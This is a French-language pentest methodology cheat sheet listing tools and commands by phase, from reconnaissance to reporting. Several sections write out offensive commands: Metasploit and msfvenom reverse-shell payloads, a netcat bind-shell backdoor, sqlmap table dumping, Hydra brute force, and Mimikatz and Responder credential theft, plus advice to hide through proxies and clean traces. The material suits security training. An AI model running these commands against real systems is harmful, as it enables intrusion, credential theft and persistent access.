# Méthodologie de Pentest - Outils et Commandes

## 1. Planification et Reconnaissance (OSINT)

### Reconnaissance Passive
**Outils :**
- **theHarvester** : Collecte d'emails, sous-domaines, IPs
  ```bash
  theHarvester -d example.com -b google,bing,linkedin
  ```

- **Shodan** : Recherche d'appareils connectés
  ```bash
  shodan search "apache country:FR"
  shodan host 192.168.1.1
  ```

- **Google Dorking** : Recherche avancée
  ```
  site:example.com filetype:pdf
  inurl:admin site:example.com
  intitle:"index of" site:example.com
  ```

- **Recon-ng** : Framework de reconnaissance
  ```bash
  recon-ng
  use recon/domains-hosts/google_site_web
  set SOURCE example.com
  run
  ```

- **Maltego** : Analyse de liens et corrélations (GUI)

- **Subfinder** : Énumération de sous-domaines
  ```bash
  subfinder -d example.com
  ```

### Reconnaissance Active
- **Ping Sweep** :
  ```bash
  nmap -sn 192.168.1.0/24
  fping -g 192.168.1.0/24
  ```

- **Whois** :
  ```bash
  whois example.com
  whois 192.168.1.1
  ```

- **DNS Enumeration** :
  ```bash
  dig example.com
  nslookup example.com
  dnsrecon -d example.com
  fierce -dns example.com
  ```

## 2. Scan et Énumération

### Découverte d'hôtes
**Nmap** (Network Mapper) :
```bash
# Scan ping
nmap -sn 192.168.1.0/24

# Scan TCP SYN
nmap -sS 192.168.1.1

# Scan UDP
nmap -sU 192.168.1.1

# Scan complet avec détection OS et services
nmap -A -p- 192.168.1.1

# Scan stealthé
nmap -sS -f -D RND:10 192.168.1.1
```

**Masscan** : Scanner haute vitesse
```bash
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### Énumération de services
**Nmap Scripts** :
```bash
# Scripts par défaut
nmap -sC 192.168.1.1

# Scripts de vulnérabilités
nmap --script vuln 192.168.1.1

# Scripts SMB
nmap --script smb-enum-shares,smb-enum-users 192.168.1.1
```

**Enum4linux** : Énumération SMB/NetBIOS
```bash
enum4linux -a 192.168.1.1
```

**Nikto** : Scanner de vulnérabilités web
```bash
nikto -h http://192.168.1.1
```

## 3. Analyse des Vulnérabilités

### Scanners de vulnérabilités
**Nessus** : Scanner commercial
- Interface web : https://localhost:8834

**OpenVAS** : Scanner open source
```bash
openvas-setup
openvas-start
```

**Nuclei** : Scanner moderne basé sur templates
```bash
nuclei -u https://example.com
nuclei -l urls.txt -t cves/
```

**Nikto** : Spécifique web
```bash
nikto -h https://example.com -Format htm -output report.html
```

### Analyse manuelle
**Searchsploit** : Recherche d'exploits
```bash
searchsploit apache 2.4
searchsploit -m 12345
```

**CVE Search** :
```bash
cve_search.py --product apache --version 2.4.41
```

## 4. Exploitation

### Frameworks d'exploitation
**Metasploit** :
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

**Exploit-DB** :
```bash
searchsploit -m 12345
python exploit.py target_ip
```

### Exploitation Web
**SQLmap** : Injection SQL
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs
sqlmap -u "http://example.com/page.php?id=1" -D database --tables
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
```

**Burp Suite** : Proxy d'interception web
- Interface graphique pour l'analyse des requêtes HTTP

**OWASP ZAP** : Proxy de sécurité web
```bash
zap-baseline.py -t https://example.com
```

**XSStrike** : Détection XSS
```bash
xsstrike.py -u "https://example.com/search.php?q=test"
```

### Exploitation Réseau
**Hydra** : Attaque par force brute
```bash
hydra -l admin -P passwords.txt ssh://192.168.1.1
hydra -L users.txt -P passwords.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

**Medusa** : Alternative à Hydra
```bash
medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh
```

**John the Ripper** : Cassage de mots de passe
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

**Hashcat** : Cassage GPU
```bash
hashcat -a 0 -m 1000 hashes.txt rockyou.txt
```

## 5. Post-exploitation

### Collecte d'informations
**LinEnum** : Énumération Linux
```bash
./LinEnum.sh -t
```

**Windows PrivEsc** :
```cmd
systeminfo
whoami /priv
net user
net localgroup administrators
```

**PowerSploit** : Scripts PowerShell
```powershell
Import-Module PowerSploit
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
```

### Élévation de privilèges
**Linux Exploit Suggester** :
```bash
./linux-exploit-suggester.sh
```

**Windows Exploit Suggester** :
```cmd
python windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.txt
```

### Mouvement latéral
**Mimikatz** : Extraction de credentials
```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

**BloodHound** : Analyse d'Active Directory
```bash
bloodhound-python -u username -p password -ns 192.168.1.10 -d domain.com -c all
```

**Responder** : Interception de credentials
```bash
responder -I eth0 -w -r -d
```

### Persistence
**Netcat** : Backdoor simple
```bash
# Serveur
nc -nlvp 4444 -e /bin/bash

# Client
nc 192.168.1.100 4444
```

**Msfvenom** : Génération de payloads
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
```

## 6. Rapport et Documentation

### Capture d'écran
**Screenshot tools** :
```bash
scrot -s screenshot.png  # Linux
import screenshot.png    # ImageMagick
```

### Génération de rapports
**Dradis** : Plateforme collaborative de reporting

**Serpico** : Générateur de rapports de pentest

**PlexTrac** : Plateforme de gestion des vulnérabilités

### Documentation automatisée
**Faraday** : IDE de pentest collaboratif

**KeepNote** : Prise de notes structurée

**CherryTree** : Notes hiérarchiques

## Distributions et Frameworks

### Distributions spécialisées
- **Kali Linux** : Distribution la plus populaire
- **Parrot Security OS** : Alternative à Kali
- **BlackArch** : Distribution Arch spécialisée
- **Pentoo** : Distribution Gentoo pour le pentest

### Frameworks complets
- **Metasploit Framework** : Le plus connu
- **Cobalt Strike** : Commercial, pour red team
- **Empire** : PowerShell et Python
- **Covenant** : Framework C# pour red team

## Bonnes Pratiques

1. **Toujours avoir une autorisation écrite** avant de commencer
2. **Documenter chaque étape** et commande utilisée
3. **Sauvegarder les preuves** (screenshots, logs)
4. **Respecter les limites** définies dans le scope
5. **Ne pas modifier/supprimer** de données
6. **Utiliser des VPN/proxies** pour l'anonymat
7. **Nettoyer les traces** après le test
8. **Communiquer rapidement** les vulnérabilités critiques